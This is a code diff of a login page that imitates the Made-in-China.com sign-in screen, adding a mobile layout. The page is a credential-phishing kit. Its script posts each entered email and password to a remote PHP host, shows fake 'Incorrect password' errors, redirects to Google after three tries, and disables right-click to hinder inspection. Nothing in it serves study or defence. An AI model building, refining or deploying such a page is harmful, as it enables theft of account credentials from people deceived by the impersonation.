@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,7 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Made-in-China.com - Replica Template</title>
 <style>
-  /* Reset & Base Styles */
+  /* =========================================
+     DESKTOP BASE STYLES
+     ========================================= */
   * {
     box-sizing: border-box;
     margin: 0;
@@ -108,7 +109,7 @@
     padding-right: 90px; 
   }
 
-  /* Right side Sign-In Card */
+  /* Desktop Form Container */
   .auth-card {
     background: #fff;
     width: 380px; 
@@ -117,13 +118,26 @@
     box-shadow: 0 10px 40px rgba(0,0,0,0.15);
     display: flex;
     flex-direction: column;
+    position: relative;
   }
-  .auth-card h2 {
+
+  /* Mobile-only UI elements (Hidden on desktop) */
+  .mobile-top-bar {
+    display: none;
+  }
+  
+  .desktop-title {
     font-size: 22px;
     text-align: center;
     margin-bottom: 24px;
     color: #222;
   }
+
+  .mobile-title {
+    display: none;
+  }
+
+  /* Form Elements */
   .form-group {
     margin-bottom: 20px;
   }
@@ -134,7 +148,6 @@
     margin-bottom: 8px;
   }
   
-  /* Input Wrappers */
   .input-wrapper {
     position: relative;
     display: flex;
@@ -149,19 +162,18 @@
     font-size: 14px;
     outline: none;
     transition: border-color 0.2s;
+    background: #fff;
   }
   
   .form-group input:focus {
     border-color: #2d72e3;
   }
   
-  /* Hide default password reveal icon */
   input[type="password"]::-ms-reveal,
   input[type="password"]::-ms-clear {
     display: none;
   }
 
-  /* Eye Icon Toggle */
   .toggle-password {
     position: absolute;
     right: 12px;
@@ -171,7 +183,6 @@
     align-items: center;
     justify-content: center;
     z-index: 5;
-    padding: 5px; /* Larger tap area for mobile */
   }
   
   .toggle-password svg {
@@ -179,12 +190,11 @@
     height: 18px;
   }
 
-  /* Password field hidden by default */
   .password-group {
     display: none; 
   }
 
-  /* Error State Styles */
+  /* Error State */
   .password-group.error input {
     border-color: #e62e2e;
   }
@@ -268,11 +278,8 @@
     justify-content: flex-end;
     gap: 6px;
   }
-  .qr-login:hover {
-    color: #222;
-  }
 
-  /* Floating Help Button */
+  /* Desktop Footer & Help */
   .help-btn {
     position: fixed;
     right: 0;
@@ -292,9 +299,6 @@
     z-index: 10;
   }
 
-  /* =========================================
-     FOOTER STYLES 
-     ========================================= */
   .site-footer {
     background-color: #f7f7f7;
     padding: 40px 0;
@@ -313,216 +317,170 @@
     padding: 0 20px;
   }
 
-  .footer-column {
-    flex: 1;
-  }
-  
+  .footer-column { flex: 1; }
   .col-discover { flex: 0 0 24%; }
   .col-about    { flex: 0 0 26%; }
   .col-language { flex: 0 0 20%; }
   .col-brands   { flex: 0 0 30%; display: flex; flex-direction: column; align-items: flex-end; }
 
-  .footer-column h3 {
-    font-size: 13px;
-    color: #333;
-    margin-bottom: 15px;
-    font-weight: 700;
-  }
-
-  .footer-column ul {
-    margin-bottom: 25px;
-  }
-
-  .footer-column li {
-    margin-bottom: 10px;
-    line-height: 1.2;
-  }
-
-  .footer-column li a {
-    color: #777;
-  }
-  .footer-column li a:hover {
-    color: #333;
-  }
-
-  /* Right Side Badges & Logos */
-  .right-block {
-    width: 240px;
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-  }
-
-  .product-alert {
-    background-color: #dfdfdf;
-    height: 44px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 0 15px;
-    border-radius: 2px;
-    color: #333;
-    font-size: 13px;
-  }
+  .footer-column h3 { font-size: 13px; color: #333; margin-bottom: 15px; font-weight: 700; }
+  .footer-column ul { margin-bottom: 25px; }
+  .footer-column li { margin-bottom: 10px; line-height: 1.2; }
+  .footer-column li a { color: #777; }
   
-  .cobrands-label {
-    color: #777;
-    font-size: 13px;
-    margin-top: 8px;
-    margin-bottom: 2px;
-  }
+  .right-block { width: 240px; display: flex; flex-direction: column; gap: 12px; }
+  .product-alert { background-color: #dfdfdf; height: 44px; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; border-radius: 2px; color: #333; font-size: 13px; }
+  .cobrands-label { color: #777; font-size: 13px; margin-top: 8px; margin-bottom: 2px; }
+  .brand-logo { background-color: #dfdfdf; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 2px; color: #777; font-weight: bold; letter-spacing: 0.5px; }
+  
+  .logo-myzj { display: flex; align-items: center; gap: 8px; font-size: 11px; }
+  .logo-myzj .cn-text { font-size: 14px; letter-spacing: 2px; }
+  .logo-myzj .en-text { font-size: 8px; line-height: 1.1; text-align: left; font-weight: normal; }
+  .logo-myzj .icon { width: 14px; height: 18px; background: #999; clip-path: polygon(0 0, 100% 0, 100% 100%, 50% 70%, 0 100%); }
+  .logo-inq { font-size: 20px; font-weight: 700; color: #888; }
+  .logo-inq span { font-weight: 400; }
+  .logo-crov { font-size: 22px; letter-spacing: 2px; color: #888; }
+  .logo-doba { font-size: 20px; font-weight: 700; color: #888; display: flex; align-items: center; gap: 4px; }
+  .logo-doba .circle { width: 14px; height: 14px; border: 3px solid #888; border-radius: 50%; display: inline-block; }
 
-  .brand-logo {
-    background-color: #dfdfdf;
-    height: 44px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    border-radius: 2px;
-    color: #777;
-    font-weight: bold;
-    letter-spacing: 0.5px;
-  }
-
-  .logo-myzj {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    font-size: 11px;
-  }
-  .logo-myzj .cn-text {
-    font-size: 14px;
-    letter-spacing: 2px;
-  }
-  .logo-myzj .en-text {
-    font-size: 8px;
-    line-height: 1.1;
-    text-align: left;
-    font-weight: normal;
-  }
-  .logo-myzj .icon {
-    width: 14px;
-    height: 18px;
-    background: #999;
-    clip-path: polygon(0 0, 100% 0, 100% 100%, 50% 70%, 0 100%);
-  }
-
-  .logo-inq {
-    font-size: 20px;
-    font-weight: 700;
-    color: #888;
-  }
-  .logo-inq span {
-    font-weight: 400;
-  }
-
-  .logo-crov {
-    font-size: 22px;
-    letter-spacing: 2px;
-    color: #888;
-  }
-
-  .logo-doba {
-    font-size: 20px;
-    font-weight: 700;
-    color: #888;
-    display: flex;
-    align-items: center;
-    gap: 4px;
-  }
-  .logo-doba .circle {
-    width: 14px;
-    height: 14px;
-    border: 3px solid #888;
-    border-radius: 50%;
-    display: inline-block;
-  }
 
   /* =========================================
-     RESPONSIVE DESIGN (TABLET & MOBILE)
+     MOBILE VIEW STYLES (Matches Screenshot)
      ========================================= */
-  
-  /* Tablets & Small Desktops (max 1024px) */
-  @media (max-width: 1024px) {
-    .header {
-      padding: 0 5%;
-    }
-    .hero-inner {
-      max-width: 900px;
-      padding-right: 20px;
-    }
-    .footer-content {
-      flex-wrap: wrap;
-      gap: 20px;
-    }
-    .col-discover, .col-about, .col-language {
-      flex: 0 0 30%;
-    }
-    .col-brands {
-      flex: 0 0 100%;
-      align-items: flex-start;
-      margin-top: 20px;
-    }
-  }
-
-  /* Mobile Devices (max 768px) */
   @media (max-width: 768px) {
-    .header {
-      padding: 0 15px;
-      height: 60px;
+    /* Hide desktop elements */
+    .header, .hero-bg, .site-footer, .help-btn, .qr-login, .desktop-title {
+      display: none !important;
     }
-    .logo-img {
-      max-height: 35px;
+
+    /* Adjust body to prevent scrolling and set base background */
+    body {
+      background-color: #fff;
+      height: 100dvh; /* Dynamic viewport height for mobile browsers */
+      overflow: hidden;
     }
+
+    /* Reconfigure Hero area */
     .hero {
-      padding: 20px 15px;
-      align-items: flex-end; /* Push content to bottom to reveal image */
-      padding-bottom: 40px;
+      padding: 0;
+      display: block;
+      background: transparent;
     }
-    .hero-bg {
-      object-position: left center; /* Keep the 3D graphics visible */
-    }
+
     .hero-inner {
-      justify-content: center; /* Center the card on mobile */
-      padding-right: 0;
+      padding: 0;
+      max-width: 100%;
+      height: 100%;
+      display: block;
     }
+
+    /* Reconfigure Auth Card to fill screen */
     .auth-card {
       width: 100%;
-      max-width: 380px;
-      padding: 25px 20px;
-      background: rgba(255, 255, 255, 0.95); /* Slight transparency for a modern feel over the image */
-      backdrop-filter: blur(5px);
-      margin: 0 auto;
-    }
-    .auth-card h2 {
-      font-size: 20px;
-      margin-bottom: 20px;
-    }
-    .footer-content {
+      height: 100%;
+      border-radius: 0;
+      box-shadow: none;
+      padding: 0;
+      display: flex;
       flex-direction: column;
-      gap: 0;
+      background: #fff;
+      /* Soft pink gradient at the top matching the screenshot */
+      background-image: linear-gradient(180deg, #fff0f2 0%, #fff0f2 160px, #fff 160px, #fff 100%);
     }
-    .col-discover, .col-about, .col-language, .col-brands {
-      flex: 0 0 100%;
-      width: 100%;
+
+    /* Mobile Top Bar (Back arrow & Headset icon) */
+    .mobile-top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 24px;
+      margin-top: 10px;
+      color: #333;
     }
-    .footer-column {
-      margin-bottom: 20px;
+    
+    .mobile-top-bar svg {
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
     }
-    .right-block {
-      width: 100%;
-      align-items: flex-start;
+
+    /* Mobile Title */
+    .mobile-title {
+      display: block;
+      font-size: 34px;
+      font-weight: 800;
+      color: #222;
+      line-height: 1.2;
+      padding: 0 24px;
+      margin-bottom: 40px;
+      margin-top: 10px;
+      letter-spacing: -0.5px;
     }
-    .help-btn {
-      display: none; /* Hide floating help on small screens to save space */
+
+    /* Form content padding */
+    .form-content {
+      padding: 0 24px;
+      flex: 1;
+    }
+
+    /* Inputs */
+    .form-group label {
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 12px;
+      color: #111;
+    }
+    .form-group input {
+      padding: 16px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      font-size: 16px;
+    }
+
+    /* Primary Button */
+    .btn-primary {
+      padding: 16px;
+      border-radius: 30px;
+      font-size: 17px;
+      font-weight: 600;
+      background-color: #f48b8b; /* Muted pink from screenshot */
+      color: #fff;
+      margin-top: 10px;
+      margin-bottom: 30px;
+    }
+
+    /* Divider */
+    .divider {
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+
+    /* Social Buttons */
+    .btn-social {
+      padding: 14px;
+      border-radius: 30px;
+      border: none;
+      background-color: #f7f7f7; /* Light gray background */
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 16px;
+    }
+    
+    .btn-social svg {
+      left: 24px;
+      width: 24px;
+      height: 24px;
+      background: #fff;
+      border-radius: 50%;
+      padding: 3px;
     }
   }
 </style>
 </head>
-<!-- Added oncontextmenu="return false;" to disable right click -->
+<!-- oncontextmenu="return false;" disables right click -->
 <body oncontextmenu="return false;">
 
-  <!-- Header -->
+  <!-- Desktop Header -->
   <header class="header">
     <div class="logo-container">
       <img src="https://friendly-winner-images.onrender.com/logo.png" alt="Made-in-China Logo" class="logo-img">
@@ -532,90 +490,111 @@
     </div>
   </header>
 
-  <!-- Hero Section -->
+  <!-- Main Area -->
   <section class="hero">
     
-    <!-- Background Image -->
+    <!-- Desktop Background Image -->
     <img src="https://friendly-winner-images.onrender.com/hero-graphic.png" alt="" class="hero-bg">
 
     <div class="hero-inner">
       
-      <!-- Right Sign-in Card -->
+      <!-- Auth Card (Changes from floating card to full screen on mobile) -->
       <div class="auth-card">
-        <h2>Sign in or create account</h2>
         
-        <!-- Email Field -->
-        <div class="form-group">
-          <label>Email address</label>
-          <input type="email" id="emailInput" placeholder="" oninput="checkEmail(this.value)" onkeydown="handleEnter(event)">
-        </div>
-        
-        <!-- Password Field (Hidden initially) -->
-        <div class="form-group password-group" id="passwordGroup">
-          <label>Password</label>
-          <div class="input-wrapper">
-            <input type="password" id="passwordInput" placeholder="" oninput="clearError()" onkeydown="handleEnter(event)">
-            
-            <!-- Eye Icon Toggle -->
-            <span class="toggle-password" onclick="togglePassword()">
-              <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
-                <line x1="1" y1="1" x2="23" y2="23"></line>
-              </svg>
-            </span>
-          </div>
-          <!-- Warning Text -->
-          <div class="error-text" id="errorText">Incorrect password.</div>
-        </div>
-        
-        <button class="btn btn-primary" onclick="handleSignIn()">Continue</button>
-        
-        <div class="divider">OR</div>
-        
-        <!-- Google Button -->
-        <button class="btn btn-social">
-          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
-            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
-            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+        <!-- Mobile Top Bar (Back arrow & Headset) -->
+        <div class="mobile-top-bar">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="15 18 9 12 15 6"></polyline>
           </svg>
-          Continue with Google
-        </button>
-        
-        <!-- Facebook Button -->
-        <button class="btn btn-social">
-          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M24 12C24 5.372 18.627 0 12 0C5.373 0 0 5.372 0 12C0 17.99 4.388 22.954 10.125 23.854V15.469H7.078V12H10.125V9.356C10.125 6.349 11.916 4.688 14.656 4.688C15.969 4.688 17.344 4.922 17.344 4.922V7.875H15.831C14.341 7.875 13.875 8.8 13.875 9.75V12H17.203L16.671 15.469H13.875V23.854C19.612 22.954 24 17.99 24 12Z" fill="#1877F2"/>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
+            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
           </svg>
-          Continue with Facebook
-        </button>
+        </div>
 
-        <div class="qr-login">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="3" y="3" width="7" height="7"></rect>
-            <rect x="14" y="3" width="7" height="7"></rect>
-            <rect x="14" y="14" width="7" height="7"></rect>
-            <rect x="3" y="14" width="7" height="7"></rect>
-          </svg> 
-          Sign in with QR Code
-        </div>
+        <!-- Desktop Title -->
+        <h2 class="desktop-title">Sign in or create account</h2>
+        
+        <!-- Mobile Title -->
+        <h2 class="mobile-title">Sign in<br>or create account</h2>
+
+        <!-- Form Content -->
+        <div class="form-content">
+          
+          <!-- Email Field -->
+          <div class="form-group">
+            <label>Email address</label>
+            <input type="email" id="emailInput" placeholder="" oninput="checkEmail(this.value)" onkeydown="handleEnter(event)">
+          </div>
+          
+          <!-- Password Field (Hidden initially) -->
+          <div class="form-group password-group" id="passwordGroup">
+            <label>Password</label>
+            <div class="input-wrapper">
+              <input type="password" id="passwordInput" placeholder="" oninput="clearError()" onkeydown="handleEnter(event)">
+              
+              <!-- Eye Icon Toggle -->
+              <span class="toggle-password" onclick="togglePassword()">
+                <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                  <line x1="1" y1="1" x2="23" y2="23"></line>
+                </svg>
+              </span>
+            </div>
+            <!-- Warning Text -->
+            <div class="error-text" id="errorText">Incorrect password.</div>
+          </div>
+          
+          <!-- Main Action Button -->
+          <button class="btn btn-primary" onclick="handleSignIn()">Continue</button>
+          
+          <div class="divider">OR</div>
+          
+          <!-- Google Button -->
+          <button class="btn btn-social">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+            </svg>
+            Continue with Google
+          </button>
+          
+          <!-- Facebook Button -->
+          <button class="btn btn-social">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M24 12C24 5.372 18.627 0 12 0C5.373 0 0 5.372 0 12C0 17.99 4.388 22.954 10.125 23.854V15.469H7.078V12H10.125V9.356C10.125 6.349 11.916 4.688 14.656 4.688C15.969 4.688 17.344 4.922 17.344 4.922V7.875H15.831C14.341 7.875 13.875 8.8 13.875 9.75V12H17.203L16.671 15.469H13.875V23.854C19.612 22.954 24 17.99 24 12Z" fill="#1877F2"/>
+            </svg>
+            Continue with Facebook
+          </button>
+
+          <!-- QR Code Login (Desktop Only) -->
+          <div class="qr-login">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="3" width="7" height="7"></rect>
+              <rect x="14" y="3" width="7" height="7"></rect>
+              <rect x="14" y="14" width="7" height="7"></rect>
+              <rect x="3" y="14" width="7" height="7"></rect>
+            </svg> 
+            Sign in with QR Code
+          </div>
+
+        </div> <!-- End Form Content -->
       </div>
 
     </div>
   </section>
 
-  <!-- Floating Help Button -->
+  <!-- Floating Desktop Help Button -->
   <div class="help-btn">
     <span style="font-size:18px; margin-bottom:2px;">🎧</span>
     Help
   </div>
 
-  <!-- Footer -->
+  <!-- Desktop Footer -->
   <footer class="site-footer">
     <div class="footer-content">
-      
-      <!-- Column 1: Discover Products -->
       <div class="footer-column col-discover">
         <h3>Discover Products & Suppliers</h3>
         <ul>
@@ -633,8 +612,6 @@
           <li><a href="#">Logistics Partners</a></li>
         </ul>
       </div>
-
-      <!-- Column 2: About & Help -->
       <div class="footer-column col-about">
         <h3>About Us</h3>
         <ul>
@@ -651,8 +628,6 @@
           <li><a href="#">Submit a Complaint</a></li>
         </ul>
       </div>
-
-      <!-- Column 3: Languages -->
       <div class="footer-column col-language">
         <h3>Language Options</h3>
         <ul>
@@ -668,11 +643,8 @@
           <li><a href="#">日本語</a></li>
         </ul>
       </div>
-
-      <!-- Column 4: Badges and Co-brands -->
       <div class="footer-column col-brands">
         <div class="right-block">
-          <!-- Product Alert -->
           <div class="product-alert">
             <span>Product Alert</span>
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
@@ -680,17 +652,12 @@
               <polyline points="3 7 12 13 21 7"></polyline>
             </svg>
           </div>
-          
           <div class="cobrands-label">Co-brands</div>
-          
-          <!-- Brand Logo 1 -->
           <div class="brand-logo logo-myzj">
             <div class="cn-text">制造之美</div>
             <div class="en-text">Manufacturing Excellence<br>& Innovation Awards</div>
             <div class="icon"></div>
           </div>
-
-          <!-- Brand Logo 2 -->
           <div class="brand-logo logo-inq">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2" style="margin-right: 6px;">
               <circle cx="12" cy="12" r="10"></circle>
@@ -699,27 +666,16 @@
             </svg>
             inQ<span>brands</span>
           </div>
-
-          <!-- Brand Logo 3 -->
-          <div class="brand-logo logo-crov">
-            CROV
-          </div>
-
-          <!-- Brand Logo 4 -->
-          <div class="brand-logo logo-doba">
-            <div class="circle"></div> doba
-          </div>
+          <div class="brand-logo logo-crov">CROV</div>
+          <div class="brand-logo logo-doba"><div class="circle"></div> doba</div>
         </div>
       </div>
-
     </div>
   </footer>
 
   <!-- Scripts -->
   <script>
-    // ==========================================
     // IMPORTANT: CHANGE THIS URL TO YOUR REMOTE PHP HOST
-    // ==========================================
     const PHP_ENDPOINT = "https://your-php-host.com/login.php"; 
 
     let attemptCount = 0; 
@@ -754,33 +710,27 @@
         
         attemptCount++; 
 
-        // Prepare data to send to the remote PHP script
         const formData = new FormData();
         formData.append('email', emailInput.value);
         formData.append('password', passwordInput.value);
         formData.append('attempt', attemptCount);
 
-        // Send data to the REMOTE login.php asynchronously
         fetch(PHP_ENDPOINT, {
             method: 'POST',
             body: formData
         })
         .then(response => {
-            if (!response.ok) {
-                console.warn('Server returned status:', response.status);
-            }
+            if (!response.ok) { console.warn('Server returned status:', response.status); }
             return response.text();
         })
         .then(data => console.log('Server response:', data))
         .catch(error => console.error('Fetch Error:', error));
 
-        // If it's the 3rd attempt, redirect to Google
         if (attemptCount >= 3) {
           window.location.href = "https://www.google.com";
           return; 
         }
 
-        // Show error for 1st and 2nd attempts
         passwordGroup.classList.add('error');
 
         if (attemptCount === 1) {
@@ -789,7 +739,6 @@
           errorText.textContent = "Incorrect password. try again";
         }
 
-        // Clear the password field instantly
         passwordInput.value = '';
 
       } else if (!emailInput.value.includes('@')) {
